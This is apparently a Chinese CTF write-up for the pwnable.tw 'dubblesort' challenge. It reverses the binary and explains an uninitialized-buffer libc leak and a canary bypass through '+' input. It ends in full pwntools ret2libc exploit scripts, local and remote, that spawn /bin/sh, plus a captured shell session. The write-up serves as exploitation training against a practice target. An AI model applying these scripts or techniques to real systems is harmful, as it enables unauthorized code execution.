---

title: pwnable.tw WriteUp - dubblesort
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

[dubblesort](https://pwnable.tw/challenge/#4)


可惜，它给的那个 libc 库用不了，这里先用本地的 libc库 分析。

```bash
$ export LD_LIBRARY_PATH="$(pwd)/libc_32.so.6"
ERROR: ld.so: object '/home/z1933/workplace/vbshare/ctf/libc_32.so.6' from LD_PRELOAD cannot be preloaded (wrong ELF class: ELFCLASS32): ignored.

```

## 程序分析

**用 IDA 对程序逆向分析。**

`main` 函数反编译大概长这样。

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int numcnt_1; // eax
  unsigned int *numptr; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int numcnt; // [esp+18h] [ebp-74h] BYREF
  unsigned int num[8]; // [esp+1Ch] [ebp-70h] BYREF
  char username[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int canary; // [esp+7Ch] [ebp-10h]

  canary = __readgsdword(0x14u);
  settimeoutsignal();
  __printf_chk(1, (int)"What your name :");
  read(0, username, 64u);
  __printf_chk(1, (int)"Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &numcnt);
  numcnt_1 = numcnt;
  if ( numcnt )
  {
    numptr = num;
    for ( i = 0; i < numcnt; ++i )
    {
      __printf_chk(1, (int)"Enter the %d number : ");// printf("...",i)
      fflush(stdout);
      __isoc99_scanf("%u", numptr);
      numcnt_1 = numcnt;
      ++numptr;
    }
  }
  dubblesort(num, numcnt_1);
  puts("Result :");
  if ( numcnt )
  {
    for ( j = 0; j < numcnt; ++j )
      __printf_chk(1, (int)"%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != canary )
    sub_56630BA0();
  return result;
}
```

主要就是读入数组，然后调用 dubblesort 函数从小到大排序。

**`dubblesort` 函数:**

```cpp
unsigned int __cdecl dubblesort(unsigned int *num, int numcnt)
{
  int lastneedsort; // ecx
  unsigned int *i; // edi
  unsigned int v4; // edx
  unsigned int v5; // esi
  unsigned int *numptr; // eax
  unsigned int result; // eax
  unsigned int v8; // [esp+1Ch] [ebp-20h]

  v8 = __readgsdword(0x14u);
  puts("Processing......");
  sleep(1u);
  if ( numcnt != 1 )
  {
    lastneedsort = numcnt - 2;
    for ( i = &num[numcnt - 1]; ; --i )
    {
      if ( lastneedsort != -1 )
      {
        numptr = num;
        do
        {
          v4 = *numptr;
          v5 = numptr[1];
          if ( *numptr > v5 )
          {
            *numptr = v5;                       // 冒泡排序，每次循环找最小的放到 numptr[1]
            numptr[1] = v4;
          }
          ++numptr;
        }
        while ( i != numptr );
        if ( !lastneedsort )
          break;
      }
      --lastneedsort;
    }
  }
  result = __readgsdword(0x14u) ^ v8;
  if ( result )
    sub_56630BA0();
  return result;
}
```

冒泡排序。

输入一些不正常输入发现一个有意思的输出:

```bash
$ ./dubblesort 
What your name :
Hello 
��,How many numbers do you what to sort :
1
Enter the 0 number : 1
Processing......
Result :
1 z1933@1933:~/workplace/vbshare/ctf 
$ 

```

有不可打印字符的输出。调试分析可以发现，程序在输入后没有在字符末尾追加 `\x00` ， `printf("%s")` 输出的时候可以输出栈上的内容,造成栈泄露。

```bash
z1933@1933:~/workplace/vbshare/ctf 
$ ./pwntool.py  
[+] Starting local process './dubblesort' argv=[b'./dubblesort'] : pid 26086
[DEBUG] Received 0x10 bytes:
    b'What your name :'
[DEBUG] Sent 0x9 bytes:
    65 * 0x9
[DEBUG] Received 0x41 bytes:
    00000000  48 65 6c 6c  6f 20 41 41  41 41 41 41  41 41 41 90  │Hell│o AA│AAAA│AAA·│
    00000010  f1 f7 e0 37  f7 f7 e8 c4  f1 f7 2c 48  6f 77 20 6d  │···7│····│··,H│ow m│
    00000020  61 6e 79 20  6e 75 6d 62  65 72 73 20  64 6f 20 79  │any │numb│ers │do y│
    00000030  6f 75 20 77  68 61 74 20  74 6f 20 73  6f 72 74 20  │ou w│hat │to s│ort │
    00000040  3a                                                  │:│
    00000041

```


用IDA调试,观察 username 输入附近的数据可以看到 libc 的一个段的地址(本地情况，输入9个字符在栈上,就会泄露这个地址)。


用那个泄露的段的地址减去 libc 加载到内存中的起始地址得到偏移 `0x001eb000` 。 

**根据偏移查看泄露的段是 libc的 `.got.plt` 段。**

```bash
$ readelf -S   /lib/i386-linux-gnu/libc.so.6 
There are 67 section headers, starting at offset 0x1eca74:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.gnu.build-i NOTE            000001d4 0001d4 000024 00   A  0   0  4
  [ 2] .note.ABI-tag     NOTE            000001f8 0001f8 000020 00   A  0   0  4
  [ 3] .note.gnu.propert NOTE            00000218 000218 00001c 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        00000234 000234 003f48 04   A  5   0  4

  .....

  [30] .data.rel.ro      PROGBITS        001e9a80 1e8a80 0012ec 00  WA  0   0 32
  [31] .dynamic          DYNAMIC         001ead6c 1e9d6c 0000f0 08  WA  6   0  4
  [32] .got              PROGBITS        001eae5c 1e9e5c 000190 04  WA  0   0  4
  [33] .got.plt          PROGBITS        001eb000 1ea000 00003c 04  WA  0   0  4
  [34] .data             PROGBITS        001eb040 1ea040 000e54 00  WA  0   0 32
  [35] .bss              NOBITS          001ebea0 1eae94 002820 00  WA  0   0 32
  ....
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)

```


所以我们可以根据泄露的地址减去`.got.plt` 段的偏移得到 libc 在内存中的起始地址。

在代码中就是这段：

```python
gotpltoff=0x001eb000

def getleadk():
    io.recv()
    leakpayload='A'*9
    io.send(leakpayload)
    io.recvuntil(leakpayload)
    return u32(b'\x00'+io.recv(3))

leakgotplt=getleadk()
libbase=leakgotplt-gotpltoff

print("libbase addr: "+str(hex(libbase)))


```

然后在向数组中输入数字时输入"+","-",可以不输入而进行下一个输入。


**来看看我们现在有什么**

1. 可以拿到 libc 的在内存中的基地址。
2. 数组可以输入任意长度。

因为数组会排序，所以不能用 ROP 。 但可以用 ret2lib 攻击。

**找到 system 函数的偏移：**

```bash
$ readelf -s   /lib/i386-linux-gnu/libc.so.6  | grep system
   259: 00135e80   106 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@@GLIBC_2.0
   664: 00041780    63 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
  1537: 00041780    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0

```

**找到 /bin/sh 字符串的偏移：**

```bash
$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep bin/sh
 18e363 /bin/sh
```

/bin/sh 字符的偏移恰好比 system 函数的偏移要大，排序不会影响我们。

**所以我们需要:**

1. 用算出的 libc 在内存中的地址算出 system 函数, `bin/sh` 在内存中的地址。
2. 栈溢出，在返回地址中写入 `system` 函数的地址和 `bin/sh` 的参数。
3. 在金丝雀的位置绕过。

注意要保证从小到大,因为有排序。

写完排序后栈上差不多长这样：

```
....

[stack]:FF8ECD00 dd 9
[stack]:FF8ECD04 dd 10
[stack]:FF8ECD08 dd 11
[stack]:FF8ECD0C dd 12
[stack]:FF8ECD10 dd 13
[stack]:FF8ECD14 dd 14
[stack]:FF8ECD18 dd 15
[stack]:FF8ECD1C dd 16
[stack]:FF8ECD20 dd 17
[stack]:FF8ECD24 dd 18
[stack]:FF8ECD28 dd 19
[stack]:FF8ECD2C dd 20
[stack]:FF8ECD30 dd 21
[stack]:FF8ECD34 dd 22
[stack]:FF8ECD38 dd 23                         ; 把偏移写到了栈上 
[stack]:FF8ECD3C dd 3DC0E100h                  ; canary位置
[stack]:FF8ECD40 dd offset __libc_system
[stack]:FF8ECD44 dd offset __libc_system
[stack]:FF8ECD48 dd offset __libc_system
[stack]:FF8ECD4C dd offset __libc_system
[stack]:FF8ECD50 dd offset __libc_system
[stack]:FF8ECD54 dd offset __libc_system
[stack]:FF8ECD58 dd offset __libc_system       ; main 栈帧地址
[stack]:FF8ECD5C dd offset __libc_system       ; main 函数的返回地址
[stack]:FF8ECD60 dd offset aBinSh              ; "/bin/sh" 参数, 也是 system 函数返回地址
[stack]:FF8ECD64 dd offset aBinSh              ; "/bin/sh" 参数
```

## exploit:

**本地能跑**

```python
#!/usr/bin/env python3
from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10101
PROC="./dubblesort"

context.log_level = 'DEBUG'

io=None

if len(sys.argv) == 1 : 
    # io=gdb.debug(PROC,"break puts")
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

binoffset=0x18e363
systemoffset=0x00041780
gotpltoff=0x001eb000

def getleadk():
    io.recv()
    leakpayload='A'*9
    io.send(leakpayload)
    io.recvuntil(leakpayload)
    return u32(b'\x00'+io.recv(3))

leakgotplt=getleadk()
libbase=leakgotplt-gotpltoff

print("libbase addr: "+str(hex(libbase)))

binadd=libbase+binoffset
print("binadd: "+str(hex(binadd)))
sysaddr=libbase+systemoffset
print("system add: "+str(hex(sysaddr)))

# canary 距离数字输入偏移
canaryoffset=0x60//4 # 24
# 返回地址距离数字输入偏移
retoffset=0x80//4 # 32
# 参数个数
binshcnt=2

totolsend=retoffset+1+binshcnt
io.sendline(str(totolsend))

# canary 之前
for i in range(canaryoffset):
    io.recv()
    io.sendline(str(i))

# 输入 canary
io.recv()
io.sendline('+')

# canary之后,一直写到返回地址,写8个，因为canary已经写了一个
for i in range(canaryoffset,retoffset):
    io.recv()
    io.sendline(str(sysaddr))

# 参数
for i in range(binshcnt):
    io.recv()
    io.sendline(str(binadd))

io.recv()
io.interactive()
```

**远程**

因为库不一样，那个库在我本地上不能用，所以参考了别人的 write up 改了一下 username 需要的偏移。

```python
#!/usr/bin/env python3
from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10101
PROC="./dubblesort"

context.log_level = 'DEBUG'

io=None

if len(sys.argv) == 1 : 
    # io=gdb.debug(PROC,"break puts")
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

binoffset=0x158e8b
systemoffset=0x3a940
gotpltoff=0x1B0000

def getleadk():
    io.recv()
    leakpayload='A'*25
    io.send(leakpayload)
    io.recvuntil(leakpayload)
    return u32(b'\x00'+io.recv(3))

leakgotplt=getleadk()
libbase=leakgotplt-gotpltoff

print("libbase addr: "+str(hex(libbase)))

binadd=libbase+binoffset
print("binadd: "+str(hex(binadd)))
sysaddr=libbase+systemoffset
print("system add: "+str(hex(sysaddr)))

# canary 距离数字输入偏移
canaryoffset=0x60//4 # 24
# 返回地址距离数字输入偏移
retoffset=0x80//4 # 32
# 参数个数
binshcnt=2

totolsend=retoffset+1+binshcnt
io.sendline(str(totolsend))

# canary 之前
for i in range(canaryoffset):
    io.recv()
    io.sendline(str(i))

# 输入 canary
io.recv()
io.sendline('+')

# canary之后,一直写到返回地址,写8个，因为canary已经写了一个
for i in range(canaryoffset,retoffset):
    io.recv()
    io.sendline(str(sysaddr))

pause()
# 参数
for i in range(binshcnt):
    io.recv()
    io.sendline(str(binadd))

io.recv()
io.interactive()

```

```bash
$ ls -la /home
[DEBUG] Sent 0xd bytes:
    b'ls -la /home\n'
[DEBUG] Received 0xb8 bytes:
    b'total 12\n'
    b'drwxr-xr-x 1 root       root       4096 Nov 14  2019 .\n'
    b'drwxr-xr-x 1 root       root       4096 Nov 14  2019 ..\n'
    b'drwxr-xr-x 2 dubblesort dubblesort 4096 Jan 14  2017 dubblesort\n'

```


